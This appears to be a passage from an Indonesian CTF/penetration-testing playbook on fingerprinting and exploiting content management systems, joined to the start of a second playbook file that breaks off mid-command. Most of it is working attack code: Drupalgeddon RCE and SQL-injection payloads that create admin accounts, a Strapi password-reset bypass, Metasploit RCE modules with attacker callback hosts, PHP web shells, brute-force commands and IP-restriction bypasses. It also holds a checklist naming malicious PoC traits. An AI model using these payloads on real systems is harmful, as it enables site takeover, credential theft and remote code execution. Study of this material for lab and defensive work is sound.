url = f"{target}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
payload = {
    'form_id': 'user_register_form',
    '_drupal_ajax': '1',
    'mail[#post_render][]': 'exec',
    'mail[#type]': 'markup',
    'mail[#markup]': cmd
}

r = requests.post(url, data=payload, verify=False)
if r.status_code == 200:
    # Mengambil output teks di akhir string response json
    print("[+] Response Output:")
    print(r.text.split('[{"command"')[0])
else:
    print(f"[-] Target not vulnerable or returned status {r.status_code}")
```

#### 2. CVE-2019-6340 (Drupalgeddon3 / REST Core RCE)

- **Target Versi:** Drupal 8.x < 8.6.10 dengan modul `RESTful Web Services` aktif.
- **Metode Serangan:** Mengirimkan payload serialization PHP via HTTP Request method non-standar (`PATCH` atau `POST`).

Bash

```
# Verifikasi & RCE via REST Services
curl -s -k -X POST "http://10.10.11.200/node?_format=hal_json" \
  -H "Content-Type: application/hal+json" \
  -d '{
    "_links": {
      "type": {
        "href": "http://10.10.11.200/rest/type/shortcut/default"
      }
    },
    "_embedded": {
      "http://10.10.11.200/rest/relation/shortcut/default/link": [
        {
          "uri": "http://example.com",
          "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";s:7:\"passthru\";}s:9:\"_fn_close\";s:7:\"whoami\";}"
        }
      ]
    }
  }'
```

#### 3. CVE-2014-3704 (Drupalgeddon1) — SQL Injection

- **Target Versi:** Drupal 7.x sebelum versi 7.32.
- **Mekanisme Serangan:** Injeksi SQL array pada modul database abstraksi, memungkinkan pembuatan akun admin sekunder secara instan.

Bash

```
# Membuat akun admin baru dengan nama 'attacker' dan password 'pwned'
python3 -c '
import urllib.request, urllib.parse
url = "http://10.10.11.200/?q=node&destination=node"
# Injeksi array ke form login
data = urllib.parse.urlencode({
    "name[0;insert into users (uid,name,pass,status) values (1111,\"attacker\",\"$S$Dk.pW5.Z2B6gU/V/8k...\",1);#]": "test",
    "name[0]": "test",
    "pass": "shit",
    "form_id": "user_login_block"
}).encode("utf-8")
urllib.request.urlopen(url, data=data)
print("[+] User injection sent!")
'
```

---

### 5.5 Drupal ke RCE (Jika Mendapatkan Akses Admin)

#### Method: Mengaktifkan Modul 'PHP Filter' (Drupal 7)

1. Buka dashboard: `Modules`.
2. Centang checkbox **PHP Filter**, kemudian klik **Save Configuration**.
3. Buka `Add Content` →→ `Basic Page`.
4. Pada dropdown format masukan (Text format), ubah dari _Filtered HTML_ menjadi **PHP code**.
5. Masukkan payload ke body konten:

PHP

```
<?php system($_GET['c']); ?>
```

6. Simpan halaman, lalu picu shell: `http://10.10.11.200/?q=node/X&c=whoami`.

---

## 📦 Bagian 6: Other CMS Detection

### 6.1 Ghost CMS

Ghost adalah headless blogging platform modern berbasis arsitektur Node.js.

- **Sinyal & Port:** Default berjalan pada port `2368`, panel manajemen terletak di `/ghost/`.
- **Deteksi:**
    
    Bash
    
    ```
    curl -s http://10.10.11.200:2368/ghost/ | grep -i "Ghost"
    ```
    
- **Common Vulnerability (CVE-2022-41654):** Pengguna dengan role `Contributor` dapat mengubah settings newsletter dan membaca kredensial integrasi via SQL Injection.

---

### 6.2 Strapi (Headless CMS)

Strapi adalah Node.js headless open-source framework yang sering ditemukan pada CTF medium-hard.

- **Sinyal & Port:** Default berjalan di port `1337`, path admin pada `/admin/`.
- **Deteksi:**
    
    Bash
    
    ```
    curl -s http://10.10.11.200:1337/admin/init | jq .
    # Output: {"data":{"hasAdmin":true}}
    ```
    

#### CVE-2019-18818 (Unauthenticated Password Reset Bypass)

Versi Strapi `< 3.0.0-beta.17.5` memungkinkan pengubahan password akun administrator tanpa token valid.

Bash

```
# Reset password admin tanpa token
curl -X POST "http://10.10.11.200:1337/admin/auth/reset-password" \
     -H "Content-Type: application/json" \
     -d '{
       "code": {"$ne": null},
       "password": "NewPwnedPassword123!",
       "passwordConfirmation": "NewPwnedPassword123!"
     }'
```

#### CVE-2019-19609 (Authenticated Remote Code Execution)

Setelah login menggunakan kredensial hasil reset, manfaatkan eksekusi modul plugin installer:

Bash

```
# Eksploitasi via Metasploit
msfconsole -q -x "use exploit/linux/http/strapi_admin_install_rce; \
set RHOSTS 10.10.11.200; set RPORT 1337; \
set USERNAME admin@example.com; set PASSWORD NewPwnedPassword123!; \
set LHOST 10.10.14.5; run"
```

---

### 6.3 Concrete5

- **Sinyal Identifikasi:** Direktori `/concrete/`, `/index.php/login`, dan token anti-CSRF bernama `ccm_token`.
- **Deteksi:**
    
    Bash
    
    ```
    curl -s http://10.10.11.200/concrete/ | grep -i "Concrete5"
    ```
    
- **Metode RCE:** Jika mendapat admin, Concrete5 memungkinkan upload file dengan ekstensi `.php` secara langsung melalui menu _Allowed File Types_ di konfigurasi system management.

---

### 6.4 TYPO3

- **Sinyal Identifikasi:** Folder path `/typo3/`, cookie `fe_typo_user`, path skrip `/typo3conf/`.
- **Deteksi:**
    
    Bash
    
    ```
    curl -s http://10.10.11.200/typo3/ | grep -i "TYPO3"
    ```
    
- **Attack Vector:** Deserialization via backend core module (CVE-2019-12792).

---

### 6.5 Generic Admin Panel Detection

Jika panel administrasi merupakan aplikasi buatan sendiri (in-house) atau dashboard template umum (AdminLTE, Tabler):

Bash

```
# 1. Cek Favicon Hash menggunakan curl dan python3 (MurmurHash3)
curl -s http://10.10.11.200/favicon.ico | python3 -c '
import mmh3, sys
import codecs
hash = mmh3.hash(sys.stdin.buffer.read())
print(f"[+] Favicon MMH3 Hash: {hash}")
'
```

_Gunakan hasil hash untuk mencari jenis framework di Shodan/Censys._

#### Kredensial Default Panel Generik (CTF Hit-List)

Coba kombinasi dasar berikut sebelum melakukan brute force besar-besaran:

- `admin:admin`
- `admin:password`
- `admin:admin123`
- `administrator:administrator`
- `root:root`
- `test:test`
- `guest:guest`

---

## 🔍 Bagian 7: CVE Lookup & Exploit Workflow

### 7.1 Setelah Mendapatkan Versi CMS — Workflow Pencarian CVE

#### Pencarian via Searchsploit (Lokal)

Bash

```
# 1. Cari kerentanan core spesifik versi
searchsploit wordpress 5.8
searchsploit joomla 3.9
searchsploit drupal 7.54

# 2. Batasi pencarian hanya untuk Remote Code Execution (RCE)
searchsploit wordpress 5. | grep -i "RCE"
searchsploit drupal | grep -i "Remote Code Execution"

# 3. Salin skrip exploit ke direktori kerja saat ini
searchsploit -m 44449.py ./
```

#### Dorking GitHub PoC Terbaru

Bash

```
# Format Google Dork untuk exploit publik
# "WordPress <versi>" exploit github
# "CVE-XXXX-XXXX" site:github.com
```

---

### 7.2 Evaluasi PoC Sebelum Dijalankan (Zero-Trust)

Sebelum mengeksekusi skrip Python/Bash dari Internet atau ExploitDB di mesin Parrot OS Anda, lakukan audit statis cepat:
```text
```
CHECKLIST AUDIT POC SCRIPT:
[ ] 1. Apakah ada baris encoding base64 mencurigakan yang dievaluasi? (eval(base64_decode(...)))
[ ] 2. Apakah script membuka koneksi socket keluar selain ke IP Target? (Mengecek reverse shell trap)
[ ] 3. Apakah script mengeksekusi system removal? (rm -rf /, format drives, drop table)
[ ] 4. Apakah variabel target IP dan Port telah diarahkan dengan benar sesuai parameter target?
```

Periksa script secara manual dengan command pager:

Bash

```
less exploit.py
```

---

```

### 7.3 Metasploit untuk CMS Exploits

Metasploit menyediakan modul eksploitasi yang stabil untuk CMS:

Bash

```
# Buka console tanpa banner lambat
msfconsole -q

# Cari modul berdasarkan nama CMS
msf6 > search wordpress type:exploit
msf6 > search drupalgeddon

# Template konfigurasi standar modul web CMS
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > set RHOSTS 10.10.11.200
msf6 > set RPORT 80
msf6 > set TARGETURI /
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 4444
msf6 > check
msf6 > exploit
```

---

## 🗺️ Bagian 8: Decision Tree Master CMS

Gunakan alur diagram keputusan berikut saat menemukan sinyal web application dalam target CTF:
```text
```
                        [ WEB APPLICATION DITEMUKAN ]
                                      |
                         Fuzzing & Passive Analysis
                                      |
        +-----------------------------+-----------------------------+
        |                             |                             |
 [ wp-* / xmlrpc ]             [ administrator/ ]           [ sites/ / CHANGELOG ]
        |                             |                             |
        v                             v                             v
  == WORDPRESS ==                == JOOMLA ==                  == DRUPAL ==
        |                             |                             |
 1. Cek Versi via:             1. Cek Versi via:             1. Cek Versi via:
    /feed/ atau readme            manifests XML                 CHANGELOG.txt
        |                             |                             |
 2. WPScan Enumeration         2. JoomScan Scan              2. Droopescan Scan
    (Users & Plugins)                 |                             |
        |                      3. CVE-2023-23752 API         3. Cek Drupalgeddon
 3. Plugin Vulnerable?            Leak Check?                   (2018-7600 / 2019-6340)
    +-- YA -> Eksekusi PoC            +-- YA -> Ambil Creds         +-- YA -> RCE Shell
    +-- TIDAK                         +-- TIDAK                     +-- TIDAK
        |                                 |                             |
 4. Login Brute Force          4. User Registration/         4. Admin Login Guessing
    (XML-RPC Multicall)           SQLi Check?                       |
        |                                 |                  5. Admin -> Module /
 5. Admin Panel Didapat        5. Admin Panel Didapat           PHP Filter Upload
        |                                 |                             |
 6. Edit Theme (404.php)       6. Edit Template                         v
    atau Upload Evil Zip          (error.php)                      [ ROOT / USER ]
        |                                 |
        +---------------+-----------------+
                        |
                        v
          [ INITIAL ACCESS / WEB SHELL ]
```

---

```

## 💻 Bagian 9: Automation Scripts

Simpan skrip-skrip berikut di mesin Parrot OS Anda di direktori `~/tools/scripts/` untuk mempercepat proses uji penetrasi otomatis.

### 9.1 `cms_detect.sh`

Skrip komprehensif untuk deteksi identitas CMS dan auto-pivot ke tool spesifik.

Bash

```
#!/usr/bin/env bash
# cms_detect.sh - Deteksi otomatis CMS dan eksekusi tool lanjutan
# Pemakaian: ./cms_detect.sh http://10.10.11.200

TARGET="$1"

if [ -z "$TARGET" ]; then
    echo -e "\e[31m[-] Error: Masukkan URL target.\e[0m"
    echo -e "Usage: $0 http://<TARGET_IP>"
    exit 1
fi

echo -e "\e[34m[*] Memulai fingerprinting CMS untuk: $TARGET\e[0m"

# 1. Jalankan WhatWeb secara pasif
WHATWEB_OUT=$(whatweb -a 1 "$TARGET")

# 2. Logic Identifikasi
if echo "$WHATWEB_OUT" | grep -qi "WordPress"; then
    WP_VER=$(echo "$WHATWEB_OUT" | grep -o 'WordPress\[[^]]*\]' | cut -d'[' -f2 | tr -d ']')
    echo -e "\e[32m[+] CMS Terdeteksi: WordPress (Versi: ${WP_VER:-Unknown})\e[0m"
    echo -e "\e[33m[!] Menjalankan WPScan enumerasi dasar...\e[0m"
    wpscan --url "$TARGET" --enumerate u,vp --detection-mode passive
    
elif echo "$WHATWEB_OUT" | grep -qi "Joomla"; then
    echo -e "\e[32m[+] CMS Terdeteksi: Joomla\e[0m"
    echo -e "\e[33m[!] Memeriksa kerentanan REST API (CVE-2023-23752)...\e[0m"
    API_CHECK=$(curl -s "$TARGET/api/index.php/v1/config/application?public=true")
    if echo "$API_CHECK" | grep -qi "password"; then
        echo -e "\e[31m[CRITICAL] Target rentan terhadap CVE-2023-23752!\e[0m"
        echo "$API_CHECK" | jq .
    else
        echo -e "\e[34m[*] Menjalankan JoomScan...\e[0m"
        joomscan -u "$TARGET"
    fi

elif echo "$WHATWEB_OUT" | grep -qi "Drupal"; then
    echo -e "\e[32m[+] CMS Terdeteksi: Drupal\e[0m"
    echo -e "\e[33m[!] Memeriksa Drupalgeddon2 (CVE-2018-7600)...\e[0m"
    DRUPAL_CHECK=$(curl -s -k -X POST "$TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
      --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id")
    if echo "$DRUPAL_CHECK" | grep -qi "uid="; then
        echo -e "\e[31m[CRITICAL] Target rentan terhadap Drupalgeddon2!\e[0m"
        echo -e "Output: $DRUPAL_CHECK"
    else
        echo -e "[-] Exploit otomatis tidak berhasil. Jalankan droopescan secara detail."
    fi

else
    echo -e "\e[33m[-] CMS populer tidak terdeteksi via signature standar.\e[0m"
    echo -e "\e[34m[*] Memeriksa endpoint manual via curl...\e[0m"
    
    HTTP_WP=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-login.php")
    HTTP_JM=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/administrator/")
    
    if [ "$HTTP_WP" -eq 200 ]; then
        echo -e "\e[32m[+] Menemukan /wp-login.php (HTTP 200) -> Target adalah WordPress.\e[0m"
    elif [ "$HTTP_JM" -eq 200 ]; then
        echo -e "\e[32m[+] Menemukan /administrator/ (HTTP 200) -> Target adalah Joomla.\e[0m"
    else
        echo -e "[-] Tidak ada endpoint login CMS standar yang terbuka."
    fi
fi
```

#### Cara Penggunaan

Bash

```
chmod +x cms_detect.sh
./cms_detect.sh http://10.10.11.200
```

---

### 9.2 `wordpress_enum.sh`

Skrip otomatis khusus WordPress untuk mendeteksi versi, membongkar user lewat REST API, dan mengaudit plugin via list file.

Bash

```
#!/usr/bin/env bash
# wordpress_enum.sh - Targeted WP Enumerator
TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

echo "=================================================="
echo "    TARGETED WORDPRESS ENUMERATION TOOL           "
echo "=================================================="

# 1. Deteksi Versi
echo -e "
[*] 1. Mencari Versi WordPress..."
VERSION=$(curl -s "$TARGET" | grep -i '<meta name="generator" content="WordPress' | grep -o '[0-9.]*')
if [ -z "$VERSION" ]; then
    VERSION=$(curl -s "$TARGET/feed/" | grep -o '<generator>https://wordpress.org/?v=[0-9.]*' | cut -d'=' -f2)
fi
echo -e "[+] Deteksi Versi: ${VERSION:-Tidak Terdeteksi}"

# 2. Enumerasi User via REST API
echo -e "
[*] 2. Mengekstraksi Users via wp-json API..."
USERS=$(curl -s "$TARGET/wp-json/wp/v2/users")
if echo "$USERS" | grep -q "id"; then
    echo "$USERS" | jq -r '.[] | "User ID: \(.id) | Name: \(.name) | Slug/Username: \(.slug)"'
else
    echo "[-] REST API dibatasi atau tidak mengekspos endpoint user."
fi

# 3. Deteksi XML-RPC
echo -e "
[*] 3. Memeriksa Status xmlrpc.php..."
XML_REQ=$(curl -s -X POST "$TARGET/xmlrpc.php")
if echo "$XML_REQ" | grep -q "XML-RPC server accepts POST requests only"; then
    echo -e "[+] XML-RPC AKTIF! Berpotensi brute force cepat multicall."
else
    echo -e "[-] XML-RPC non-aktif atau diblokir."
fi

# 4. Deteksi Plugin Pasif dari Source Code
echo -e "
[*] 4. Mengurai Plugin Aktif dari Tampilan Depan..."
curl -s "$TARGET" | grep -o 'wp-content/plugins/[^/]*' | cut -d'/' -f3 | sort -u | while read -r plugin; do
    echo -e "    - Ditemukan Plugin: \e[32m$plugin\e[0m"
    README_URL="$TARGET/wp-content/plugins/$plugin/readme.txt"
    VER=$(curl -s "$README_URL" | grep -i "Stable tag:" | awk '{print $NF}')
    if [ -n "$VER" ]; then
        echo -e "      Versi Stable: $VER"
    fi
done

echo -e "
[+] Selesai. Gunakan username di atas untuk brute-force."
```

#### Cara Penggunaan

Bash

```
chmod +x wordpress_enum.sh
./wordpress_enum.sh http://10.10.11.200
```

---

## 🛠️ Bagian 10: Common Errors & Troubleshooting

### 1. WPScan Mencapai Limit API (Rate Limited)

- **Penyebab:** Akun gratis WPScan memiliki batas 25 request API per hari.
- **Solusi:** Jalankan WPScan tanpa API token untuk enumerasi lokal, atau jalankan dengan database offline:
    
    Bash
    
    ```
    wpscan --url http://10.10.11.200 --enumerate u,p --no-update
    ```
    

### 2. WPScan Tidak Ditemukan / Error Dependency Ruby di Parrot

- **Penyebab:** Gem system ruby corrupted setelah update paket.
- **Solusi:** Install ulang WPScan via package manager atau docker:
    
    Bash
    
    ```
    sudo apt --fix-broken install
    sudo apt install --reinstall wpscan -y
    # Alternatif menggunakan Docker:
    docker run -it --rm wpscanteam/wpscan --url http://10.10.11.200
    ```
    

### 3. Target Memblokir Default User-Agent Milik Tools

- **Penyebab:** Web Application Firewall (WAF) seperti Cloudflare atau modul Apache `mod_security` mengenali signature `WPScan/3.x` atau `WhatWeb`.
- **Solusi:** Gunakan flag custom user-agent browser umum:
    
    Bash
    
    ```
    wpscan --url http://10.10.11.200 --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    whatweb -U "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://10.10.11.200
    ```
    

### 4. PoC Script Drupalgeddon Tidak Menghasilkan Output

- **Penyebab:** Drupal 8 target menggunakan form registrasi yang dimatikan untuk publik (`user_register_form` disabled).
- **Solusi:** Ubah routing injection parameter ke form password reset:
    
    Bash
    
    ```
    curl -s -k -X POST "http://10.10.11.200/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" --data "form_id=user_pass"
    ```
    

### 5. File `xmlrpc.php` Mengembalikan Response 403 Forbidden

- **Penyebab:** Administrator server mengonfigurasi `.htaccess` untuk menolak request luar ke file tersebut.
- **Solusi:** Alihkan vektor serangan brute force dari XML-RPC ke login standar form `/wp-login.php` menggunakan Hydra atau script Python multithread.

### 6. Endpoint `wp-admin` Mengembalikan Status 403 Forbidden

- **Penyebab:** Direktori dibatasi berdasarkan IP internal (`Allow from 192.168.x.x`).
- **Solusi:** Bypass dengan header spoofing pada HTTP request:
    
    Bash
    
    ```
    curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" http://10.10.11.200/wp-admin/
    ```
    

### 7. JoomScan Mengalami Connection Timeout

- **Penyebab:** Firewall memblokir IP karena volume request JoomScan terlalu masif.
- **Solusi:** Tambahkan delay dan nonaktifkan pengecekan firewall bawaan JoomScan:
    
    Bash
    
    ```
    joomscan -u http://10.10.11.200 --delay 2
    ```
    

### 8. CMSeeK Memberikan Hasil False Negative

- **Penyebab:** Redirect HTTP ke HTTPS atau URL domain tidak terdaftar di `/etc/hosts`.
- **Solusi:** Pastikan Virtual Host telah di-mapping ke IP target di `/etc/hosts` terlebih dahulu, dan sertakan skema protokol secara lengkap (`http://domain.htb`).

### 9. Versi CMS Sama Sekali Tidak Terdeteksi

- **Penyebab:** Admin menghapus file `readme.html`, tag generator, dan mematikan API.
- **Solusi:** Lakukan hash comparison terhadap file JavaScript statis bawaan:
    
    Bash
    
    ```
    curl -s http://10.10.11.200/wp-includes/js/jquery/jquery.js | md5sum
    ```
    
    Cocokkan nilai MD5 yang didapat dengan hash database file core WordPress di repository GitHub resmi.

### 10. Listing Direktori `/wp-content/plugins/` Tertutup (Status 403)

- **Penyebab:** Konfigurasi web server menonaktifkan `Options Indexes`.
- **Solusi:** Beralih ke active directory brute force menggunakan wordlist plugin dari SecLists:
    
    Bash
    
    ```
    ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u http://10.10.11.200/wp-content/plugins/FUZZ -mc 200,301,403
    ```
    

---

## ⚡ Bagian 11: Cheatsheet Akhir

### 📋 WORDPRESS QUICK REFERENCE

Bash

```
# WPScan - Enumerasi lengkap user dan plugin rentan
wpscan --url http://TARGET -e u,vp --detection-mode aggressive

# User Enum One-Liner (REST API)
curl -s http://TARGET/wp-json/wp/v2/users | jq -r '.[].slug'

# User Enum One-Liner (Author Brute 1-5)
for i in {1..5}; do curl -s -I "http://TARGET/?author=$i" | grep -Ei "location:" | awk '{print $2}'; done

# Brute Force Admin Login (WPScan)
wpscan --url http://TARGET -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc

# Generate Reverse Shell Plugin ZIP
mkdir -p /tmp/wp_shell && echo '<?php system($_GET["cmd"]); ?>' > /tmp/wp_shell/shell.php && cd /tmp/wp_shell && zip shell.zip shell.php
```

---

### 📋 JOOMLA QUICK REFERENCE

Bash

```
# JoomScan Default
joomscan -u http://TARGET

# Exploit CVE-2023-23752 (Config & DB Credential Leak)
curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | jq .

# Cek Versi Manual via XML Manifest
curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep "<version>"
```

---

### 📋 DRUPAL QUICK REFERENCE

Bash

```
# Droopescan
droopescan scan drupal -u http://TARGET

# Drupalgeddon2 (CVE-2018-7600) One-Liner RCE (id command)
curl -s -k -X POST "http://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# Cek Versi Manual via Core Changelog
curl -s http://TARGET/core/CHANGELOG.txt | head -n 5
```

---

### 📋 DETEKSI CEPAT MULTI-CMS

Bash

```
# Fingerprinting Cepat WhatWeb
whatweb -a 3 http://TARGET -v

# Fingerprinting Non-Interaktif CMSeeK
python3 /opt/cmseek/cmseek.py -u http://TARGET --batch

# Header & Cookie Analysis
curl -s -I http://TARGET | grep -Ei "set-cookie|x-powered-by|x-generator|server"
```

---
# [🌐 File 17: CMS Detection, Fingerprinting & Exploitation Workflow](/docs/cms-detection) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export TARGET_URL="http://10.10.11.200"   # atau https jika perlu
export LHOST="10.10.14.5"
export LPORT="4444"
mkdir -p ~/cms_loot/{files,creds,shells,scans}
cd ~/cms_loot

echo "[*] Target: $TARGET_URL | LHOST: $LHOST:$LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target: http://10.10.11.200 | LHOST: 10.10.14.5:4444
```

---

## ═══════════════════════════════════════

## FASE 0: KONTEKS — DARI MANA KAMU MASUK KE FILE INI?

## ═══════════════════════════════════════

> File ini dipanggil ketika dari **nmap** atau **web recon** (file 15/16) kamu menemukan sinyal CMS.

### Langkah 0.1 — Konfirmasi Port Web Aktif

Bash

```
# Command 1: Cek port web yang terbuka
nmap -sV -p 80,443,8080,8443,8000,3000,1337,2368 $TARGET --open

# Command 2: Cek apakah ada redirect HTTP → HTTPS
curl -s -I -L http://$TARGET | grep -Ei "HTTP|Location|Server"
```

**OUTPUT BERHASIL ✅ — Port 80 terbuka, ada server web:**

text

```
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.41
```

➡️ Set URL target:

Bash

```
# Jika HTTP
export TARGET_URL="http://$TARGET"

# Jika ada redirect ke HTTPS
export TARGET_URL="https://$TARGET"

# Jika port non-standar
export TARGET_URL="http://$TARGET:8080"
```

**OUTPUT GAGAL ❌ — Port 80 closed, tapi port lain buka:**

text

```
8080/tcp open  http-proxy
1337/tcp open  waste?
```

➡️ Ini tanda **Strapi (1337)** atau **app non-standar (8080)**:

Bash

```
# Test port non-standar
curl -s http://$TARGET:1337/admin/init | jq .
curl -s http://$TARGET:8080 | head -20
```

---

### Langkah 0.2 — Tambahkan Virtual Host ke /etc/hosts (Jika Domain)

Bash

```
# Jika dari nmap atau web recon sudah ketemu domain (contoh: blog.corp.local)
# Wajib tambahkan ke /etc/hosts sebelum lanjut
echo "$TARGET blog.corp.local corp.local" | sudo tee -a /etc/hosts

# Verifikasi
curl -s -I http://blog.corp.local | head -5
```

**Output yang diharapkan:**

text

```
HTTP/1.1 200 OK
Server: Apache/2.4.41
```

---

## ═══════════════════════════════════════

## FASE 1: CMS DETECTION — IDENTIFIKASI CMS

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi CMS apa yang dipakai SEBELUM masuk ke tool spesifik.  
> **Jalankan semua 3 command sekaligus** — jangan tunggu satu selesai dulu.

### Langkah 1.1 — Triple Detection (Jalankan Paralel)

Bash

```
# Command 1: WhatWeb — paling cepat untuk fingerprint stack
whatweb -a 3 $TARGET_URL -v 2>/dev/null | tee ~/cms_loot/scans/whatweb.txt

# Command 2: CMSeeK — lebih dalam untuk CMS spesifik
python3 /opt/cmseek/cmseek.py -u $TARGET_URL --batch 2>/dev/null \
    | tee ~/cms_loot/scans/cmseek.txt

# Command 3: curl manual — cek header + meta generator
curl -s -I $TARGET_URL | grep -Ei "x-powered-by|x-generator|set-cookie|server"
curl -s $TARGET_URL | grep -i '<meta name="generator"'
```

**OUTPUT BERHASIL ✅ — WordPress terdeteksi:**

text

```
# WhatWeb output:
http://10.10.11.200 [200 OK] Apache[2.4.41], WordPress[5.8.1], 
MetaGenerator[WordPress 5.8.1], PHP[7.4.3]

# Meta tag:
<meta name="generator" content="WordPress 5.8.1" />
```

➡️ **WordPress confirmed!** Catat versi, lanjut ke **FASE 2A.**

Bash

```
export CMS="wordpress"
export CMS_VERSION="5.8.1"
echo "CMS: $CMS | Version: $CMS_VERSION" >> ~/cms_loot/scans/summary.txt
```

**OUTPUT BERHASIL ✅ — Joomla terdeteksi:**

text

```
# WhatWeb output:
http://10.10.11.200 [200 OK] Joomla, Apache[2.4.41], PHP[7.4.3]

# Cookie header:
Set-Cookie: a13f48e7880df9b3b8c6e=...   ← 32-char hex = Joomla signature
```

➡️ **Joomla confirmed!** Lanjut ke **FASE 2B.**

**OUTPUT BERHASIL ✅ — Drupal terdeteksi:**

text

```
# Header:
X-Generator: Drupal 7 (https://www.drupal.org)
X-Drupal-Cache: HIT
```

➡️ **Drupal confirmed!** Lanjut ke **FASE 2C.**

**OUTPUT GAGAL ❌ — Tidak terdeteksi oleh tools:**

text

```
# WhatWeb: Generic Web Application
# CMSeeK: No CMS detected
```

➡️ Lakukan deteksi manual:

Bash

```
# Cek path-path karakteristik CMS secara manual
declare -A CMS_PATHS=(
    ["WordPress"]="/wp-login.php /wp-admin/ /xmlrpc.php /wp-content/"
    ["Joomla"]="/administrator/ /components/ /modules/ /templates/"
    ["Drupal"]="/sites/default/ /user/login /CHANGELOG.txt /core/"
    ["Ghost"]="/ghost/ :2368/ghost/"
    ["Strapi"]="/admin/ :1337/admin/init"
)

for CMS in "${!CMS_PATHS[@]}"; do
    for path in ${CMS_PATHS[$CMS]}; do
        CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$path")
        if [[ "$CODE" == "200" || "$CODE" == "301" || "$CODE" == "302" ]]; then
            echo "[+] $CMS FOUND: $path (HTTP $CODE)"
        fi
    done
done
```

**OUTPUT BERHASIL ✅ — Manual detection menemukan path:**

text

```
[+] WordPress FOUND: /wp-login.php (HTTP 200)
[+] WordPress FOUND: /xmlrpc.php (HTTP 200)
```

➡️ WordPress dikonfirmasi manual. Lanjut ke **FASE 2A.**

**OUTPUT GAGAL ❌ — Semua path 404:**

text

```
# Semua return 404 atau 403
```

➡️ Kemungkinan bukan CMS populer atau ada path obfuscation. Lakukan:

Bash

```
# Cek favicon hash untuk fingerprint
curl -s $TARGET_URL/favicon.ico -o /tmp/favicon.ico
python3 -c "
import mmh3, base64
with open('/tmp/favicon.ico', 'rb') as f:
    data = base64.encodebytes(f.read())
print('[+] Favicon MMH3 Hash:', mmh3.hash(data))
"
# Gunakan hash untuk cari di Shodan: https://www.shodan.io/search?query=http.favicon.hash:HASH

# Cek Nikto untuk file deployment yang tertinggal
nikto -h $TARGET_URL -Tuning b -timeout 5 2>/dev/null | grep -Ei "cms|wordpress|joomla|drupal|found"

# Lanjut ke Fase 6 (Other CMS) jika masih belum ketemu
```

---

## ═══════════════════════════════════════

## FASE 2A: WORDPRESS — ENUMERATION LENGKAP

## ═══════════════════════════════════════

> **Masuk sini jika:** Fase 1 mengkonfirmasi WordPress.

### Langkah 2A.1 — Ekstrak Versi WordPress (Akurat)

Bash

```
# Method 1: RSS Feed (paling akurat, jarang disembunyikan)
curl -s $TARGET_URL/feed/ | grep -o 'wordpress\.org/?v=[0-9.]*' | cut -d'=' -f2

# Method 2: Meta generator tag
curl -s $TARGET_URL | grep -i 'meta name="generator"' | grep -o '[0-9.]*'

# Method 3: readme.html
curl -s $TARGET_URL/readme.html | grep -A2 -i "Version"

# Method 4: Query string pada asset JS
curl -s $TARGET_URL | grep -o 'wp-includes/js/wp-embed.min.js?ver=[0-9.]*' | cut -d'=' -f2
```

**OUTPUT BERHASIL ✅ — Versi terdeteksi:**

text

```
5.8.1
```

➡️ Simpan versi dan langsung cari CVE:

Bash

```
export WP_VERSION="5.8.1"
echo "[*] WordPress Version: $WP_VERSION"

# Langsung cari exploit
searchsploit wordpress $WP_VERSION
searchsploit wordpress 5.8 | grep -i "RCE\|Remote Code"
```

**OUTPUT GAGAL ❌ — Tidak ada output versi:**

text

```
# Empty output dari semua method
```

➡️ Admin menyembunyikan versi. Gunakan JavaScript hash comparison:

Bash

```
# Download file JS dan cek MD5 hash-nya
curl -s $TARGET_URL/wp-includes/js/jquery/jquery.js | md5sum
# Cocokkan hasilnya dengan: https://api.wordpress.org/core/checksums/1.0/?version=X.X.X&locale=en_US
# Google: "wordpress jquery.js md5 version fingerprint"
```

---

### Langkah 2A.2 — WPScan Full Enumeration

Bash

```
# Setup: Update database dulu
wpscan --update 2>/dev/null

# Command 1: Enumeration lengkap (users + vulnerable plugins + themes)
wpscan --url $TARGET_URL \
    --enumerate u,vp,vt \
    --detection-mode aggressive \
    --api-token "YOUR_TOKEN_HERE" \
    -o ~/cms_loot/scans/wpscan_full.txt 2>/dev/null

# Command 2: Jika tidak punya API token (tanpa CVE reference)
wpscan --url $TARGET_URL \
    --enumerate u,ap \
    --plugins-detection aggressive \
    -o ~/cms_loot/scans/wpscan_noapikey.txt 2>/dev/null

# Command 3: Jika target blokir WPScan user-agent (WAF bypass)
wpscan --url $TARGET_URL \
    --enumerate u,vp \
